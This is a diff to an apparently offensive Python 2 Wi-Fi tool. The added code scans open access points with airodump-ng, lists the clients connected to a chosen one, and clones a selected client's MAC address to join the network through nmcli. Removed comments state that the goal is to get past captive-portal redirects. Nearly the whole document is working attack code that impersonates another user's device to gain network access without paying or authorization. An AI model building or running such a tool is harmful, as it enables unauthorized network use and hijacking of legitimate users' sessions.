@@ -25,15 +25,16 @@ import csv
 # Globals
 IFACE_NAME               = None
 IFACE_ORIGINAL_MAC_ADDR  = None
-IFACE_ANONYMOUS_MAC_ADDR = None
 
 IFACE_MAC_ADDR_ANONYMIZED = False
 IFACE_IN_MONITOR_MODE     = False
+IFACE_CONNECTED           = False
 
 # External Programs
 EXT_PROG_IWCONFIG = "iwconfig"
 EXT_PROG_IFCONFIG = "ifconfig"
-EXT_PROG_AIRODUMP = "airodump-ng" 
+EXT_PROG_AIRODUMP = "airodump-ng"
+EXT_PROG_NMCLI    = "nmcli" 
 
 # airodump output files
 AIRODUMP_FILE_NAME_PREFIX = "./ff-airodump-ng"
@@ -70,6 +71,14 @@ class AccessPoint:
         self.power = power
         self.essid = essid
 
+def print_access_point_data_header():
+    print "   NUM ESSID                            BSSID             CH PRIV POWER #CLIENTS"
+    print "   --- -------------------------------- ----------------- -- ---- ----- --------"
+
+def print_access_point_data(row_number, ap, num_clients):
+    print "   " + str(row_number) + "  " + ap.essid + "  " + ap.bssid + "  " + str(ap.channel) + \
+        "  " + ap.privacy + "  " + str(ap.power) + "  " + str(num_clients)
+
 class Client:
     def __init__(self, client_mac_addr, power, num_packets, access_point_mac_addr, essid):
         self.client_mac_addr = client_mac_addr
@@ -82,13 +91,13 @@ class Client:
         print "Client: " + self.client_mac_addr + ", " + str(self.power) + ", " + \
             str(self.num_packets) + ", " + self.access_point_mac_addr + ", " + self.essid
 
-def print_access_point_data_header():
-        print "   NUM ESSID             BSSID                 CH PRIV POWER #CLIENTS"
-        print "   --- ----------------- --------------------  -- ---- ----- --------"
-
-def print_access_point_data(row_number, ap, num_clients):
-        print "   " + str(row_number) + "  " + ap.essid + "  " + ap.bssid + "  " + str(ap.channel) + "  " + ap.privacy + \
-            "  " + str(ap.power) + "  " + str(num_clients)
+def print_client_data_header():
+    print "   NUM CLIENT BSSID      POWER #PACKETS AP BSSID          AP ESSID"
+    print "   --- ----------------- ----- -------- ----------------- --------------------------------"
+                
+def print_client_data(row_number, client):
+    print "   " + str(row_number) + "  " + client.client_mac_addr + "  " + str(client.power) + "  " + \
+        str(client.num_packets) + "  " + client.access_point_mac_addr + "  " + client.essid 
 
 def parse_airodump_csv(filename):
     if not os.path.exists(filename):
@@ -166,18 +175,25 @@ def remove_airodump_files():
     except OSError:
         pass
 
-def scan_for_open_access_points(iface_name):
+def get_animated_ellipses(num_dots):
+    ellipses = ""
+    for i in xrange(num_dots):
+        ellipses += "."
+    return ellipses
+
+def select_open_access_point_target(iface_name):
     remove_airodump_files()
     airodump_command = [EXT_PROG_AIRODUMP, 
                         "-a",                               # filter unassociated clients
                         "--write-interval", "1",            # write once a second
                         "-w", AIRODUMP_FILE_NAME_PREFIX,    # output file prefix
-                        "-o", "csv",                        # only need the csv file now
+                        "-o", "csv",                        # only need the csv file
                         iface_name] 
     subproc = subprocess.Popen(airodump_command, stdout=OUTLOG, stderr=ERRLOG)
     # find and display open access points to user
     open_access_points = None
     try:
+        scan_count = 0
         while True:
             time.sleep(0.6)
             if not os.path.exists(AIRODUMP_FILE_NAME_PREFIX + AIRODUMP_FILE_NAME_CSV_POSTFIX):
@@ -186,8 +202,9 @@ def scan_for_open_access_points(iface_name):
             (access_points, clients) = parse_airodump_csv(AIRODUMP_FILE_NAME_PREFIX + AIRODUMP_FILE_NAME_CSV_POSTFIX)
             # display found access points
             os.system("clear")
-            print "[+] scanning " + GR + "(" + iface_name + ")" + WH + \
-                " for open access points, updated every second, " + GR + "<CTRL-C>" + WH + " when ready..."
+            print "[+] scanning " + GR + iface_name + WH + \
+                " for open access points, updated every second, " + GR + "<CTRL-C>" + WH + " when ready" + \
+                get_animated_ellipses(scan_count % 3 + 1)    
             print ""
             # filter for open access points
             open_access_points = []
@@ -196,28 +213,134 @@ def scan_for_open_access_points(iface_name):
                     open_access_points.append(ap)
             # print open access points
             print_access_point_data_header()
-            for i, ap in enumerate(access_points):
+            for i, ap in enumerate(open_access_points):
                 print_access_point_data(i, ap, -1)
-
-            for c in clients:
-                c.cprint()
-
+            print ""
             sys.stdout.flush()
+            scan_count += 1
     except KeyboardInterrupt:
         pass
     # kill airodump subprocess
     kill_subprocess(subproc)
-    remove_airodump_files() 
+    remove_airodump_files()
+    # shutdown if no open access points were found
+    if len(open_access_points) < 1:
+        print RE + "[-] No open access points found..." + WH
+        time.sleep(2)
+        clean_shutdown(EXIT_CODE_ERROR) 
     # let user select access point to target
-    print ""
-    print "Enter number of access point to target:"   
-    return True
+    target_access_point_selection = None
+    try:
+        while True:
+            # print open access points
+            os.system("clear")
+            print "[+] Select target access point..."
+            print ""            
+            print_access_point_data_header()
+            for i, ap in enumerate(open_access_points):
+                print_access_point_data(i, ap, -1)
+            print ""
+            sys.stdout.flush()
+            user_input = raw_input(GR + "Enter number of access point to target: " + WH)
+            try:
+                target_access_point_selection = int(user_input)
+            except ValueError:
+                print RE + "\n[-] Invalid input, not a valid number..." + WH
+                time.sleep(2)
+                continue
+            if target_access_point_selection < 0 or target_access_point_selection >= len(open_access_points):
+                print RE + "\n[-] Invalid input, number out of range..." + WH
+                time.sleep(2)
+                continue
+            break
+    except KeyboardInterrupt:
+        print ""
+        clean_shutdown(EXIT_CODE_ERROR)
+    return open_access_points[target_access_point_selection]
+
+def select_client_target(iface_name, target_access_point):
+    remove_airodump_files()
+    airodump_command = [EXT_PROG_AIRODUMP, 
+                        "-a",                                   # filter unassociated clients
+                        "--write-interval", "1",                # write once a second
+                        "-w", AIRODUMP_FILE_NAME_PREFIX,        # output file prefix
+                        "-o", "csv",                            # only need the csv file
+                        "-c", str(target_access_point.channel), # only scan target ap channel
+                        "--bssid", target_access_point.bssid,   # filter for target ap bssid
+                        iface_name] 
+    subproc = subprocess.Popen(airodump_command, stdout=OUTLOG, stderr=ERRLOG)
+    # find and display clients connected to target access point
+    target_clients = None
+    try:
+        scan_count = 0
+        while True:
+            time.sleep(0.6)
+            if not os.path.exists(AIRODUMP_FILE_NAME_PREFIX + AIRODUMP_FILE_NAME_CSV_POSTFIX):
+                continue
+            # get data from airodump
+            (access_points, clients) = parse_airodump_csv(AIRODUMP_FILE_NAME_PREFIX + AIRODUMP_FILE_NAME_CSV_POSTFIX)
+            # display found access points
+            os.system("clear")
+            print "[+] scanning for clients connected to " + GR + target_access_point.essid + \
+                 WH + ", updated every second, " + GR + "<CTRL-C>" + WH + " when ready" + \
+                get_animated_ellipses(scan_count % 3 + 1) 
+            print ""
+            # filter clients by ap bssid
+            target_clients = clients
+            # print clients
+            print_client_data_header()
+            for i, client in enumerate(clients):
+                print_client_data(i, client)
+            print ""
+            sys.stdout.flush()
+            scan_count += 1
+    except KeyboardInterrupt:
+        pass
+    # kill airodump subprocess
+    kill_subprocess(subproc)
+    remove_airodump_files()
+    # shutdown if no target clients were found
+    if len(target_clients) < 1:
+        print RE + "[-] No target clients found..." + WH
+        time.sleep(2)
+        clean_shutdown(EXIT_CODE_ERROR) 
+    # let user select target client
+    target_client_selection = None
+    try:
+        while True:
+            # print target clients
+            os.system("clear")
+            print "[+] Select target client..."
+            print ""            
+            print_client_data_header()
+            for i, client in enumerate(target_clients):
+                print_client_data(i, client)
+            print ""
+            sys.stdout.flush()
+            user_input = raw_input(GR + "Enter number of client to target: " + WH)
+            try:
+                target_client_selection = int(user_input)
+            except ValueError:
+                print RE + "\n[-] Invalid input, not a valid number..." + WH
+                time.sleep(2)
+                continue
+            if target_client_selection < 0 or target_client_selection >= len(target_clients):
+                print RE + "\n[-] Invalid input, number out of range..." + WH
+                time.sleep(2)
+                continue
+            break
+    except KeyboardInterrupt:
+        print ""
+        clean_shutdown(EXIT_CODE_ERROR)
+    return target_clients[target_client_selection]
 
 def disable_monitor_mode(iface_name):
     print "[+] disabling monitor mode for interface " + GR + IFACE_NAME + WH + "..."
     subprocess.call([EXT_PROG_IFCONFIG, iface_name, "down"], stdout=OUTLOG, stderr=ERRLOG)        
     subprocess.call([EXT_PROG_IWCONFIG, iface_name, "mode", "managed"], stdout=OUTLOG, stderr=ERRLOG)        
     subprocess.call([EXT_PROG_IFCONFIG, iface_name, "up"], stdout=OUTLOG, stderr=ERRLOG)        
+    global IFACE_IN_MONITOR_MODE
+    IFACE_IN_MONITOR_MODE = False 
     # TODO verify that managed mode was set succesfully
     return True
 
@@ -226,11 +349,16 @@ def enable_monitor_mode(iface_name):
     subprocess.call([EXT_PROG_IFCONFIG, iface_name, "down"], stdout=OUTLOG, stderr=ERRLOG)        
     subprocess.call([EXT_PROG_IWCONFIG, iface_name, "mode", "monitor"], stdout=OUTLOG, stderr=ERRLOG)        
     subprocess.call([EXT_PROG_IFCONFIG, iface_name, "up"], stdout=OUTLOG, stderr=ERRLOG)        
+    global IFACE_IN_MONITOR_MODE
+    IFACE_IN_MONITOR_MODE = True 
     # TODO verify that monitor mode was set succesfully
     return True
 
 def clean_shutdown(exit_code):
     print "[+] shutting down..."
+    # undo connection
+    if IFACE_CONNECTED == True:
+        disconnect_from_access_point(IFACE_NAME)
     # undo monitor mode
     if IFACE_IN_MONITOR_MODE == True:
         disable_monitor_mode(IFACE_NAME)
@@ -333,11 +461,42 @@ def initialize(iface_name):
         return False
     if enable_monitor_mode(iface_name) == False:
         return False
-    global IFACE_IN_MONITOR_MODE
-    IFACE_IN_MONITOR_MODE = True 
     return True
 
+def connect_to_access_point(access_point):
+    print "[+] Connecting to access point " + GR + access_point.essid + WH + "..."
+    command = [EXT_PROG_NMCLI, "device", "wifi", "connect", access_point.essid]
+    subprocess.call(command, stdout=OUTLOG, stderr=ERRLOG)
+    global IFACE_CONNECTED
+    IFACE_CONNECTED = True
+
+def disconnect_from_access_point(iface_name):
+    print "[+] Disconnecting from access point on interface " + GR + iface_name + WH + "..."
+    command = [EXT_PROG_NMCLI, "device", "disconnect", iface_name]
+    subprocess.call(command, stdout=OUTLOG, stderr=ERRLOG)
+    global IFACE_CONNECTED
+    IFACE_CONNECTED = False
+
+def setup_connection_and_wait(iface_name, target_access_point, target_client):
+    os.system("clear")
+    print "[+] Setting up connection..."
+    disable_monitor_mode(iface_name)
+    change_mac_address(IFACE_NAME, target_client.client_mac_addr)
+    connect_to_access_point(target_access_point)
+    scan_count = 0
+    try:
+        while True:
+            time.sleep(0.6)
+            os.system("clear")
+            print "[+] Connected to access point " + GR + target_access_point.essid + WH + ", with MAC " + GR + \
+                target_client.client_mac_addr + ",\n" + "   <CTRL-C>" + WH + " when done" + get_animated_ellipses(scan_count % 3 + 1) 
+            scan_count += 1
+    except KeyboardInterrupt:
+        print ""
+        pass
+
 def show_banner():
+    os.system("clear")
     print GR
     print " /$$$$$$$$                            /$$$$$$$$ /$$"
     print "| $$_____/                           | $$_____/|__/"
@@ -367,12 +526,12 @@ if __name__ == '__main__':
         sys.exit()
     try:
         show_banner()
-        disable_monitor_mode(IFACE_NAME) #temp temp
+        disconnect_from_access_point(IFACE_NAME) # TODO prob remove this by making init more robust
+        disable_monitor_mode(IFACE_NAME) # TODO prob remove this by making init more robust
         if initialize(IFACE_NAME) == True:
-            scan_for_open_access_points(IFACE_NAME)
-            #print "hi this is where the magic happens"
-            #raw_input("press <enter> to continue")
-            #find_open_access_points()
+            target_access_point = select_open_access_point_target(IFACE_NAME)
+            target_client = select_client_target(IFACE_NAME, target_access_point)
+            setup_connection_and_wait(IFACE_NAME, target_access_point, target_client)   
     except KeyboardInterrupt:
         print RE + "\n(^C) interrupted!" + WH
     except EOFError:
@@ -383,29 +542,3 @@ if __name__ == '__main__':
 
 
 
-
-"""
-This function spoofs a mac address and tries to connect to Google without a redirect
-"""
-#def connect(mac): 
-
-"""
-This function finds the devices connected to specfic access point
-"""
-#def find_connected_devices(ap):
-"""
-access_points = find_access_points()
-filtered_access_points = filter_non_wps(access_points)
-connected = False
-
-for ap in filtered_access_points :
-    devices = find_connected_devices(ap)
-    for dev in devices :
-        if connect(dev) :
-            connected = True
-            break
-    if connected :
-        break
-else :
-    #couldn't find a connected user
-"""
